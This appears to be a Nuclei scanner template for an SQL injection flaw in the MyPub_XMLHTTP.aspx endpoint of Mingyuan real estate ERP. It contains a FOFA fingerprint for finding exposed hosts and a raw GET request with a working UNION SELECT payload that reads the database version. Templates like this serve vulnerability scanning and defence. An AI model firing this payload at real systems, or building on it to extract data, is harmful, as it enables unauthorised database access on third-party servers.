id: mingyuandichanERP-MyPub_XMLHTTP_aspx-sql

info:
  name: 明源地产ERP MyPub_XMLHTTP.aspx SQL注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: body="/_common/scripts/md5-min.js"
    明源地产ERP MyPub_XMLHTTP.aspx 接口存在SQL注入漏洞,未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://mp.weixin.qq.com/s/2aenwppwEtpBzaphxUBKsw
  tags: sql injection

http:
  - raw:
      - |
        GET /Sldzkp/DZKP/MyPub_XMLHTTP.aspx/?ywtype=GETPRINTVAL&rptid=1%27+UNION+ALL+SELECT+NULL%2C%40%40version%2CNULL%2CNULL-- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'Microsoft SQL Server'
      - type: status
        status: 
          - 200